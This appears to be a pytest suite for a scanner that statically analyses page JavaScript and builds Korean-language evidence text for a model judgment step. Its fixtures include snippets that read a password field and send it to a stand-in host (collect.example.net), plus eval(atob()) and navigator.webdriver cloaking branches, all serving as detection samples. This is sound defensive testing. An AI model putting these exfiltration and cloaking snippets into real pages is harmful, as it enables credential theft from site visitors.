"""Source -> producer -> Store -> readable JS/HTML+JS -> actual Messages."""
from copy import deepcopy
from dataclasses import replace
import io
import json

import pytest

from L3_SCANNER import scan_content
from L3_SCANNER.policies import DetectionPolicy
from L3_SCANNER.policies.operational import operational_detection_policy
from L3_SCANNER.policies.runtime import RuntimeConfig
from evidence_pipeline import build_javascript_text_context, build_text_context, build_html_text_context
from evidence_pipeline.aws_runtime import persist_layer, load_existing_layer
from evidence_pipeline.aws_judgment_v2 import JudgmentV2Gateway
from evidence_pipeline.l3_html_text import assemble
from evidence_pipeline.model_text import call_text_messages, TextContextNotReady
from evidence_pipeline.records import digest
from test_l0_context_wire import LocalStore
from test_l3_html_text import saved, transport
from test_model_text import capture_l012


def capture(source=None, *, html='<input id="password" type="password"><input id="email" type="email">',
            scripts=None, policy=None, runtime=None, url='https://page.example.com/login', request='js-offline'):
    supplied = {'original_url': url, 'document_url': url, 'html': {'content': html}}
    if scripts is not None:
        supplied['scripts'] = scripts
    elif source is not None:
        supplied['scripts'] = [{'script_id': 'script-one', 'type': 'inline', 'source': source}]
    before = deepcopy(supplied)
    native = scan_content(supplied, policy if policy is not None else operational_detection_policy(), runtime)
    assert supplied == before
    raw = native['raw']
    originals = deepcopy((native, raw))
    store, event = LocalStore(), {'job_id': request, 'attempt': 1, 'url': url}
    envelope = persist_layer(event, 'l3', native, raw, store)
    loaded = load_existing_layer(event, 'l3', store)
    assert envelope == loaded and (native, raw) == originals
    return {'input': before, 'raw': store.get(envelope['artifact_refs']['raw']), 'native': loaded['observation'],
            'record': loaded['evidence_record'], 'envelope': loaded}


def document(a, combined=False, **kwargs):
    if combined:
        return build_text_context([a['record']], {'l3': a['raw']}, l3_scope='html_javascript', l3_native=a['native'], **kwargs)
    return build_javascript_text_context(a['record'], a['raw'], native=a['native'], **kwargs)


def assert_preserved(a, doc):
    prefix = 'l3' if doc.version == 'l3-content-text-1' else 'javascript'
    assert doc.source_context[prefix + '_raw'] == a['raw']
    assert doc.source_context[prefix + '_record'] == a['record']
    assert doc.source_context[prefix + '_native'] == a['native']
    for span in doc.source_map:
        block = next(b for b in doc.blocks if b.title == span['title'])
        assert doc.body[span['start']:span['end']] == '[' + block.title + ']\n' + '\n'.join(block.lines)
    for row in doc.source_context['line_map']:
        block = next(b for b in doc.blocks if b.title == row['title'])
        assert block.lines[row['line_in_block'] - 1] == row['text']
    pointers = [p for row in doc.source_context['line_map'] for p in row['sources']]
    pointers.extend(doc.source_context['model_omissions'])
    for source in pointers:
        current = {'raw': a['raw'], 'record': a['record'],
                   'selection': doc.source_context['selection_contract']}[source['source']]
        for token in source['pointer'].lstrip('/').split('/'):
            token = token.replace('~1', '/').replace('~0', '~')
            current = current[int(token)] if isinstance(current, list) else current[token]
    transport(doc)


@pytest.mark.parametrize('combined', [False, True])
def test_calls_decode_reference_constructor_and_actual_messages(combined):
    source = "const reference=eval;eval(atob('YWJj'));new Function('return 1;');Function('return 2;');"
    a = capture(source)
    before = deepcopy(a)
    doc = document(a, combined)
    assert 'atob → 위 API의 첫 번째 인자' in doc.body
    assert 'Function — 문자열로 함수를 만드는 구문; 생성된 함수의 실행은 미확인' in doc.body
    assert 'new를 사용한 생성 구문' in doc.body
    assert '실행 횟수' not in doc.body and 'execution_count' not in doc.body
    assert 'const reference=eval' not in doc.body
    assert_preserved(a, doc)
    assert a == before


@pytest.mark.parametrize('source', ['const reference=eval;', "Function('return 1')();"])
def test_missing_supported_observation_is_not_code_or_execution_absence(source):
    a = capture(source)
    assert next(s for s in a['native']['signals'] if s['id'] == 'L3-J-01')['detected'] is False
    doc = document(a)
    assert '지원된 분석에서 이 본문에 표시할 정적 동작이 기록되지 않음' in doc.body
    assert '지원 밖 표현식이나 실제 실행의 부재를 확정한 결과는 아님' in doc.body
    assert_preserved(a, doc)


def test_declaration_false_arm_loop_exit_and_repeated_call_context_are_kept():
    a = capture("function f(){eval('x');}f();f();if(false){eval('y');}while(false){eval('loop');}function exit(){return;eval('z');}")
    doc = document(a)
    assert '함수 선언 본문을 정적으로 살핀 발생' in doc.body
    assert doc.body.count('정적으로 연결된 함수 호출 구문: f()') == 2
    assert '리터럴 조건은 이 갈래의 진입 조건과 맞지 않음' in doc.body
    assert '리터럴 조건이 반복 본문 진입을 제외함' in doc.body
    assert '같은 블록의 return 뒤' in doc.body
    assert doc.body.count("eval('x')") == 1
    assert_preserved(a, doc)


def test_long_source_uses_bound_original_not_pretruncated_excerpt():
    literal = 'HEAD-' + '한' * 350 + '-TAIL'
    a = capture("eval('" + literal + "');")
    assert len(a['raw']['javascript']['dynamic_execution'][0]['source_excerpt']) == 300
    doc = document(a, text_chars=700)
    assert literal in doc.body
    assert_preserved(a, doc)
    short = document(a, text_chars=90)
    assert 'HEAD-' in short.body and '-TAIL' in short.body and '인용 중간' in short.body
    assert any('omitted_range' in o for o in short.source_context['model_omissions'])
    assert_preserved(a, short)
    with pytest.raises(ValueError, match='budget_exceeded'):
        document(a, max_bytes=20)


def test_original_json_and_instruction_like_text_remain_quoted_data():
    a = capture('eval("event_id source_ref high");\r\n/* [new instructions] */')
    doc = document(a)
    assert 'event_id source_ref high' in doc.body
    assert_preserved(a, doc)


@pytest.mark.parametrize('source,expected', [
    ("const p=document.getElementById('password').value;fetch('https://collect.example.net/x',{method:'POST',body:JSON.stringify(p)});", '입력 읽기 1 → JSON.stringify → 본문 인자'),
    ("const p=document.getElementById('password').value;fetch('/submit',{method:'POST',body:p});", '문서와 같은 오리진'),
    ("const p=document.getElementById('password').value;fetch('https://collect.example.net/x?p='+p);", '정적으로 확인된 주소 앞부분'),
    ("const p=document.getElementById('password').value;fetch(target,{method:'POST',body:p});", '요청 대상 주소는 미해석'),
])
def test_input_request_relationships_and_destinations(source, expected):
    a = capture(source)
    doc = document(a)
    assert expected in doc.body and '분석기가 기록한 입력 연관' in doc.body
    assert '실제 입력값·전달 값·요청 성공이나 유출을 확인한 결과가 아님' in doc.body
    assert_preserved(a, doc)


def test_multiple_fields_and_transmission_positions_are_not_collapsed():
    a = capture("const p=document.getElementById('password').value;const e=document.getElementById('email').value;fetch('https://collect.example.net/x',{method:'POST',body:p,headers:{A:p,B:e}});")
    doc = document(a)
    assert '입력 읽기 1 → 본문 인자' in doc.body and '입력 읽기 1 → 헤더 인자' in doc.body
    assert '입력 읽기 2 → 헤더 인자' in doc.body
    assert_preserved(a, doc)


@pytest.mark.parametrize('source,phrase', [
    ("document.getElementById('password').value;fetch('https://collect.example.net/x',{method:'POST',body:'public'});", '연결됐다는 분석 결과는 없음'),
    ("const p=document.getElementById('password').value;fetch('https://collect.example.net/x',{method:'GET',body:p});", 'GET/HEAD와 비어 있지 않은 본문이 충돌'),
    ("const p=document.getElementById('password').value;let t;if(flag){t='https://one.example.net';}else{t='https://two.example.org';}fetch(t,{method:'POST',body:p});", '선택이 확정되지 않은 주소 후보'),
])
def test_no_invented_link_and_invalid_or_conditional_request(source, phrase):
    a = capture(source)
    doc = document(a)
    assert phrase in doc.body
    if 'GET/HEAD' in phrase or '분석 결과는 없음' in phrase:
        assert '분석기가 기록한 입력 연관' not in doc.body
    assert_preserved(a, doc)


def test_private_suffix_relationship_is_distinct_from_icann_domain():
    a = capture("const p=document.getElementById('password').value;fetch('https://bob.github.io/x',{method:'POST',body:p});", url='https://alice.github.io/login')
    doc = document(a)
    assert 'ICANN 등록 도메인은 같지만' in doc.body and '사이트 범위는 다름' in doc.body
    assert_preserved(a, doc)


def test_unknown_and_known_network_destinations_both_survive():
    a = capture("fetch(target);fetch('https://api.example.net/x');")
    doc = document(a)
    assert '요청 대상 주소는 미해석' in doc.body and 'https://api.example.net/x' in doc.body
    assert next(s for s in a['record']['signals'] if s['id'] == 'L3-J-04')['detected'] is True
    assert_preserved(a, doc)


def test_script_insertion_and_multiple_redirects_keep_unresolved_targets():
    a = capture("const s=document.createElement('script');s.src='/next.js';document.body.appendChild(s);location.href='/one';location.replace(target);")
    doc = document(a)
    assert 'https://page.example.com/next.js' in doc.body
    assert 'https://page.example.com/one' in doc.body and '대상 주소 미해석' in doc.body
    assert '다운로드·내용·실행은 관측하지 않음' in doc.body
    assert_preserved(a, doc)


def test_environment_branch_original_code_and_both_redirects_are_related():
    source = "if(navigator.webdriver){location.replace('/bot');}else{location.replace('/human');}"
    a = capture(source)
    doc = document(a)
    assert source in doc.body
    assert '환경 분기 1의 참인 갈래' in doc.body and '환경 분기 1의 거짓인 갈래' in doc.body
    assert doc.body.count("location.replace('/bot')") == 1
    assert '설정된 정책이 정규화한 두 갈래 표현에서 차이를 기록함' in doc.body
    assert '환경 속성 읽기 1:' not in doc.body
    assert_preserved(a, doc)


@pytest.mark.parametrize('source', [
    "if(navigator.webdriver){show(secretOne);}else{show(secretTwo);}",
    "if(navigator.webdriver){fetch('/x',{method:'POST',body:'one'});}else{fetch('/x',{method:'POST',body:'two'});}",
])
def test_no_selected_normalized_difference_does_not_claim_equal_behavior(source):
    a = capture(source)
    doc = document(a)
    assert source in doc.body and '전체 동작이 같다고 해석할 수 없음' in doc.body
    assert_preserved(a, doc)


@pytest.mark.parametrize('source', [
    "false && eval('x');",
    "navigator.webdriver?location.replace('/a'):location.replace('/b');",
    "const p=document.getElementById('password').value;fetch('/x',{method:'POST',body:void p});",
    "const p=document.getElementById('password').value;fetch('/x',{method:'POST',body:false?p:'public'});",
])
def test_limited_producer_semantics_are_not_promoted_to_runtime_facts(source):
    a = capture(source)
    doc = document(a)
    assert '모든 JavaScript 연산 의미와 제어 흐름을 해석하지 않음' in doc.body
    assert '실행한 결과가 아님' in doc.body
    if 'body:' in source:
        assert 'void p' in doc.body or "false?p:'public'" in doc.body
        assert '분석기가 기록한 입력 연관' in doc.body
    assert_preserved(a, doc)


@pytest.mark.parametrize('scripts,phrase', [
    ([{'script_id':'s','type':'external','source_url':'https://cdn.example.net/app.js'}], '원문 미확보'),
    ([{'script_id':'s','type':'inline','source':''}], '확보한 빈 원문'),
    ([{'script_id':'s','type':'inline','source':'const = ;'}], '구문 분석에 실패'),
    ([{'script_id':'s','type':'inline','source':'{"key":"value"}','media_type':'application/ld+json'}], 'JavaScript 구문 분석 대상에서 제외'),
    ([{'script_id':'s','type':'inline','source':"eval('x');",'truncated':True}], '원문 일부만 확보'),
    ([{'script_id':'s','type':'inline','source':"eval('x');",'async_script':True}], 'async; 스크립트 간 연결·실제 실행 순서는 미확인'),
])
def test_script_acquisition_and_analysis_states(scripts, phrase):
    a = capture(scripts=scripts)
    doc = document(a)
    assert phrase in doc.body
    assert_preserved(a, doc)


def test_external_non_js_response_is_not_data_block_and_reason_is_preserved():
    a = capture(scripts=[{'script_id':'s','type':'external','source_url':'https://cdn.example.net/app.js',
                         'response':{'url':'https://cdn.example.net/app.js','status_code':200},
                         'collection_errors':[{'stage':'script_collection','code':'unsupported_script_content_type',
                                               'message':'response is not a JavaScript content type','content_type':'text/html'}]}])
    doc = document(a)
    assert '수집 응답 상태: 200' in doc.body and '외부 응답을 JavaScript 소스로 채택하지 않음' in doc.body
    assert '종류 선언에 따라' not in doc.body
    assert_preserved(a, doc)


def test_positive_with_missing_source_preserves_both_facts():
    a = capture(scripts=[{'script_id':'first','type':'inline','source':"eval('x');"},
                         {'script_id':'second','type':'external','source_url':'https://cdn.example.net/app.js'}])
    doc = document(a)
    assert "eval('x')" in doc.body and '원문 미확보' in doc.body
    assert_preserved(a, doc)


def test_no_html_handler_only_and_unconfigured_policy_do_not_become_absence():
    missing = capture(html=None)
    doc = document(missing)
    assert '페이지의 JavaScript 부재를 확인한 결과가 아님' in doc.body
    assert_preserved(missing, doc)
    handler = capture(html='<input onkeyup="eval(\'x\')">')
    combined = document(handler, True)
    assert combined.body.count("eval('x')") == 1
    assert '동적 API 구문' not in combined.body and '같은 요소·호출로 연결된 자료는 없음' in combined.body
    assert_preserved(handler, combined)
    unconfigured = capture("eval('x');", policy=DetectionPolicy())
    assert '미설정된 분석 기준' in document(unconfigured).body


def test_event_limit_keeps_dangling_decode_link_unresolved():
    a = capture("eval(atob('YWJj'));", runtime=RuntimeConfig(max_javascript_events=1))
    doc = document(a)
    assert '참조한 원래 변환 발생이 없거나 모호하여 연결 범위 미확인' in doc.body
    assert '정적 관측 개수 제한' in doc.body
    assert_preserved(a, doc)


@pytest.mark.parametrize('mutation', ['excerpt','range','script','scope','record_summary'])
def test_source_binding_mismatches_are_rejected(mutation):
    a = capture("eval('x');")
    if mutation == 'record_summary':
        next(s for s in a['record']['signals'] if s['id']=='L3-J-01')['evidence']['execution_count'] += 1
    else:
        e = a['raw']['javascript']['dynamic_execution'][0]
        if mutation == 'excerpt': e['source_excerpt'] = "eval('different')"
        elif mutation == 'range': e['source_range'] = [0,9999]
        elif mutation == 'script': e['script_id'] = 'missing'
        elif mutation == 'scope': e['execution_observed'] = True
        a['record']['raw_ref']['sha256'] = digest(a['raw'])
    with pytest.raises(ValueError):
        build_javascript_text_context(a['record'],a['raw'])


@pytest.mark.parametrize('combined', [False,True])
@pytest.mark.parametrize('mutation', ['coordinated_body','audit','downgrade','missing_input'])
def test_unreviewed_text_or_audit_is_rejected_before_provider(combined, mutation):
    a = capture("eval('x');")
    doc = document(a,combined)
    marker = 'l3_review_input' if combined else 'javascript_review_input'
    if mutation == 'coordinated_body':
        doc.blocks[-1].lines.append('Unreviewed appended judgment')
        doc.body,doc.source_map=assemble(doc.blocks)
    elif mutation == 'audit':
        doc.source_context['model_omissions'][0]['reason']='changed'
    elif mutation == 'downgrade':
        doc.version='layer-text-1'
        doc.source_context.pop(marker)
    else:
        doc.source_context.pop(marker)
    calls=[]
    def forbidden(request,**kwargs):
        calls.append(request)
        pytest.fail('Invalid document reached provider')
    gateway=JudgmentV2Gateway('https://offline.example','offline-key','offline-model',view=None,opener=forbidden)
    with pytest.raises(ValueError):
        call_text_messages(doc,gateway,'Offline test only.')
    assert calls==[]


def test_combined_l012_and_html_scope_and_default_gate(monkeypatch):
    records,raws,_=capture_l012(monkeypatch)
    base=build_text_context(records,raws)
    a=capture("eval('x');",url=records[0]['target']['original_url'],request=records[0]['request_id'])
    bundle=records+[a['record']]
    sources={**raws,'l3':a['raw']}
    doc=build_text_context(bundle,sources,l3_scope='html_javascript',l3_native=a['native'])
    assert doc.body.startswith(base.body.rstrip('\n')+'\n\n')
    assert 'JavaScript 분석 결과는 포함하지 않음' not in doc.body
    assert doc.source_context['unreviewed_layers']==[]
    assert_preserved(a,doc)
    html=build_html_text_context(a['record'],a['raw'],native=a['native'])
    assert 'JavaScript 분석 결과는 포함하지 않음' in html.body and html.version=='l3-html-text-2'
    transport(html)
    with pytest.raises(TextContextNotReady):
        build_text_context(bundle,sources)
    broken=deepcopy(bundle)
    broken[-1]['request_id']='different'
    with pytest.raises(ValueError,match='mixed_request_or_attempt'):
        build_text_context(broken,sources,l3_scope='html_javascript')


def test_saved_collected_html_js_input_is_represented_without_new_analysis():
    a=saved()
    doc=document(a,True)
    assert 'content-data-entry-boilerplate.js' in doc.body
    assert 'HTML 이벤트 속성' in doc.body and '관측·해석 한계' in doc.body
    assert_preserved(a,doc)


def test_parser_unavailable_and_source_limit_are_distinct(monkeypatch):
    from L3_SCANNER.parsers.javascript import ast
    limited = capture("eval('long-enough');", runtime=RuntimeConfig(max_script_bytes=3))
    doc = document(limited)
    assert '크기 제한으로 구문 분석하지 않음' in doc.body
    assert_preserved(limited, doc)
    monkeypatch.setattr(ast, 'esprima', None)
    unavailable = capture("eval('x');")
    doc = document(unavailable)
    assert '구문 분석기를 사용할 수 없음' in doc.body
    assert '동적 API 구문 1' not in doc.body
    assert_preserved(unavailable, doc)


@pytest.mark.parametrize('combined', [False, True])
def test_identical_failure_messages_remain_bound_to_distinct_scripts(combined):
    a = capture(scripts=[
        {'script_id': 'first', 'type': 'external', 'source_url': 'https://cdn.example.net/a.js',
         'collection_errors': [{'stage': 'script_collection', 'code': 'script_request_timeout', 'message': 'same timeout'}]},
        {'script_id': 'second', 'type': 'external', 'source_url': 'https://cdn.example.net/b.js',
         'collection_errors': [{'stage': 'script_collection', 'code': 'script_request_timeout', 'message': 'same timeout'}]},
    ])
    doc = document(a, combined)
    assert '스크립트 1 한계' in doc.body and '스크립트 2 한계' in doc.body
    assert doc.body.count('same timeout') == 2
    assert_preserved(a, doc)


def test_long_limitation_quote_uses_original_source_and_shares_existing_quote():
    condition = 'navigator.webdriver' + ' || navigator.webdriver' * 25
    a = capture(f"if({condition}){{location.replace('/a')}}else{{location.replace('/b')}}")
    doc = document(a, text_chars=2000)
    assert f'if({condition})' in doc.body
    assert doc.body.count('코드 인용 1:') == 1
    assert '한계가 기록된 구문' not in doc.body
    assert_preserved(a, doc)


def test_known_destination_sharing_does_not_hide_different_candidates():
    a = capture("fetch('/x');fetch('/x');")
    requests = a['raw']['javascript']['network_requests']
    requests[1]['destination_candidates'] = ['https://other.example.org/possible', None]
    a['record']['raw_ref']['sha256'] = digest(a['raw'])
    # Explicit injected source variation: unchanged native summary has no candidate field.
    doc = build_javascript_text_context(a['record'], a['raw'])
    assert 'https://other.example.org/possible' in doc.body
    assert '주소로 해석하지 못한 후보' in doc.body
    assert '요청 구문 1과 같은 주소' not in doc.body
    a['native'] = None
    assert_preserved(a, doc)


def test_combined_budget_applies_to_entire_document_and_both_modules():
    a = capture("eval('x');")
    js = document(a)
    full = document(a, True)
    assert len(full.body.encode()) > len(js.body.encode())
    with pytest.raises(ValueError, match='budget_exceeded'):
        document(a, True, html_max_bytes=len(js.body.encode()))
    assert_preserved(a, full)


def test_source_and_native_mismatch_are_rejected_without_messages():
    a = capture("eval('x');")
    changed = deepcopy(a['raw'])
    changed['javascript']['scripts'][0]['source'] = "eval('y');"
    with pytest.raises(ValueError):
        build_javascript_text_context(a['record'], changed, native=a['native'])
    native = deepcopy(a['native'])
    next(s for s in native['signals'] if s['id'] == 'L3-J-01')['evidence']['execution_count'] = 123
    with pytest.raises(ValueError):
        build_javascript_text_context(a['record'], a['raw'], native=native)


@pytest.mark.parametrize('combined', [False, True])
def test_long_environment_branch_keeps_recorded_arm_actions_when_middle_is_omitted(combined):
    padding = '/*' + 'x' * 2000 + '*/'
    a = capture(f"if(navigator.webdriver){{{padding}botOnly('one');state=unknown;{padding}}}"
                f"else{{{padding}humanOnly('two');state='ready';{padding}}}")
    assert next(s for s in a['record']['signals'] if s['id']=='L3-J-09')['detected'] is True
    doc = document(a, combined)
    assert '호출·생성 대상 botOnly; 인자: "one"' in doc.body
    assert '호출·생성 대상 humanOnly; 인자: "two"' in doc.body
    assert '대입 대상 state; 기록된 값: (변수 식; 이름·값 미기록)' in doc.body
    assert '대입 대상 state; 기록된 값: "ready"' in doc.body
    assert '참인 갈래의 기록된 구문' in doc.body and '거짓인 갈래의 기록된 구문' in doc.body
    assert '인용 중간' in doc.body
    assert_preserved(a, doc)


def test_environment_quote_precedes_nested_request_and_read_quotes():
    read = "document.getElementById('password').value"
    a = capture(f"if(navigator.webdriver){{location.replace('/bot')}}else{{fetch('/x',{{method:'POST',body:{read}}})}}")
    doc = document(a)
    assert doc.body.index('환경 분기 1:') < doc.body.index('입력 읽기 1:')
    assert doc.body.count(read) == 1 and doc.body.count("fetch('/x'") == 1
    assert_preserved(a, doc)


def test_inline_read_and_explicit_request_share_code_but_keep_both_occurrences():
    read = "document.getElementById('password').value"
    a = capture(f"fetch('/x',{{method:'POST',body:{read}}});")
    doc = document(a)
    assert doc.body.count(read) == 1
    assert '입력 읽기 1:' in doc.body and '요청 구문 1:' in doc.body
    assert '입력 읽기 1 → 본문 인자' in doc.body
    assert_preserved(a, doc)


def test_unchecked_xhr_configuration_is_visible_next_to_the_request():
    a = capture("const x=new XMLHttpRequest();x.open('GET','https://collect.example.net/x');"
                "x.send(document.getElementById('password').value);")
    assert a['raw']['javascript']['network_requests'][0]['request_configuration'] == 'not_checked'
    doc = document(a)
    assert '방식·본문·옵션 조합 유효성은 검사하지 않음' in doc.body
    assert '입력 읽기 1 → 요청 인자' in doc.body
    assert_preserved(a, doc)


def test_conditional_value_limit_is_near_the_first_link_without_invented_argument_causality():
    source = "const p=document.getElementById('password').value;let body;" \
             "if(navigator.webdriver){body=p}else{body='public'};" \
             "fetch('/x',{method:'POST',body:body});" + "fetch('/other');" * 40
    a = capture(source)
    doc = document(a)
    route = doc.body.index('분석기가 기록한 입력 연관')
    limit = doc.body.index('스크립트 단위의 값 해석 한계')
    assert 0 < limit - route < 200
    assert '특정 인자 계산과 직접 연결한 자료는 없음' in doc.body
    assert_preserved(a, doc)


def test_scope_only_standard_failure_has_no_duplicate_limit_shell(monkeypatch):
    from L3_SCANNER.parsers.javascript import ast
    for a in [capture("eval('x')", runtime=RuntimeConfig(max_script_bytes=2))]:
        doc = document(a)
        assert '[JavaScript 관측·해석 한계]' not in doc.body
        assert_preserved(a, doc)
    monkeypatch.setattr(ast, 'esprima', None)
    a = capture("eval('x')")
    doc = document(a)
    assert '[JavaScript 관측·해석 한계]' not in doc.body
    assert_preserved(a, doc)


def test_requests_without_input_links_do_not_get_input_flow_boilerplate():
    a = capture("fetch(target);fetch('/x');")
    doc = document(a)
    assert '입력 연관은 제한된' not in doc.body
    assert_preserved(a, doc)


def test_equal_request_limits_share_all_pointers_without_removing_occurrences():
    source = "document.getElementById('password').value;" + ''.join(f"fetch('https://public.example.org/r{i}');" for i in range(45))
    a = capture(source)
    doc = document(a)
    assert doc.body.count('조합 유효성은 검사하지 않음') == 1
    assert doc.body.count('인자로 연결됐다는 분석 결과는 없음') == 1
    assert '요청 구문 1~45의 공통 요청 설정 한계' in doc.body
    shared = next(row for row in doc.source_context['line_map'] if '1~45의 공통 요청 설정 한계' in row['text'])
    assert len(shared['sources']) == 45
    for i in range(45):
        assert f'요청 구문 {i + 1}:' in doc.body and f'https://public.example.org/r{i}' in doc.body
    assert_preserved(a, doc)


def test_same_site_but_different_origin_is_a_recorded_difference():
    a = capture("fetch('http://page.example.com/submit');")
    r = a['raw']['javascript']['network_requests'][0]['relations']
    assert r['same_site_scope'] is True and r['same_origin'] is False
    doc = document(a)
    assert '같은 사이트 범위로 기록됨; 오리진(프로토콜·호스트·포트)은 다름' in doc.body
    assert_preserved(a, doc)


@pytest.mark.parametrize('combined', [False, True])
def test_same_classification_errors_keep_their_html_input_subjects(combined):
    def classify(field):
        if field.get('name', '').startswith('failed'):
            raise RuntimeError('same controlled classification message')
        return 'password' if field.get('type') == 'password' else None
    a = capture("document.getElementById('password').value;",
                html='<input id="password" type="password"><input name="failed-a"><input name="failed-b">',
                policy=replace(operational_detection_policy(), credential_classifier=classify))
    doc = document(a, combined)
    assert 'failed-a' in doc.body and 'failed-b' in doc.body
    assert doc.body.count('same controlled classification message') == 2
    if combined:
        assert 'HTML 입력 2 분류 한계' not in doc.body
    else:
        assert 'HTML 입력 2 분류 한계' in doc.body and 'HTML 입력 3 분류 한계' in doc.body
    assert_preserved(a, doc)


@pytest.mark.parametrize('combined', [False, True])
@pytest.mark.parametrize('limit', [2, 4])
def test_event_limit_uses_preserved_classified_dom_read_and_keeps_truly_missing_read_unresolved(combined, limit):
    read = "document.getElementById('password').value"
    a = capture(f"{read};fetch('https://collect.example.net/x',{{method:'POST',body:{read}}})",
                runtime=RuntimeConfig(max_javascript_events=limit))
    js = a['raw']['javascript']
    doc = document(a, combined)
    request = js['network_requests'][0]
    if limit == 4:
        linked_id = request['source_links'][0]['source_event_id']
        assert not any(e['event_id'] == linked_id for e in js['credential_access'])
        assert js['dom_access'][1]['event_id'] == linked_id
        assert '입력 읽기 2 → 본문 인자' in doc.body
        assert '참조한 읽기 발생이 없거나 모호' not in doc.body
        assert any(p['pointer'] == '/javascript/dom_access/1' for row in doc.source_context['line_map'] for p in row['sources'])
    else:
        assert request['unresolved_source_links'] and not request['source_links']
        assert '완전한 연결로 재구성하지 않음' in doc.body
        assert '인자로 연결됐다는 분석 결과는 없음' not in doc.body
        assert '분석기가 기록한 입력 연관' not in doc.body
    assert_preserved(a, doc)


def test_conflicting_preserved_read_identity_is_rejected():
    a = capture("document.getElementById('password').value;")
    assert a['raw']['javascript']['dom_access'][0] == a['raw']['javascript']['credential_access'][0]
    a['raw']['javascript']['dom_access'][0]['credential_type'] = 'different'
    a['record']['raw_ref']['sha256'] = digest(a['raw'])
    with pytest.raises(ValueError, match='preserved_read_identity_conflict'):
        build_javascript_text_context(a['record'], a['raw'])


def test_order_limitation_is_shared_with_each_affected_script_declaration():
    a = capture(scripts=[
        {'script_id': 'a', 'type': 'inline', 'source': "eval('a')", 'async_script': True},
        {'script_id': 'b', 'type': 'inline', 'source': "eval('b')", 'defer_script': True},
    ])
    doc = document(a)
    assert doc.body.count('스크립트 간 연결·실제 실행 순서는 미확인') == 2
    assert 'module·async·defer의 연결 및 실행 순서를 확정하지 못함' not in doc.body
    assert_preserved(a, doc)
